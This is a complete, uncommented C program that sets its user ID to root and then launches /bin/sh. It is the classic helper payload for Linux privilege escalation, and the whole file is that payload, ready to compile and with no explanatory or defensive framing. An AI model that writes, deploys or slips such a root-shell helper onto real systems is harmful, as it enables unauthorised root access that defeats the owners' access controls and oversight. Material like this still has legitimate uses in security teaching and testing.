#include<stdio.h>
#include<unistd.h>

int main(int argc, const char **argv, const char **envp){
setuid(0) ;
system("/bin/sh");
return 0;
}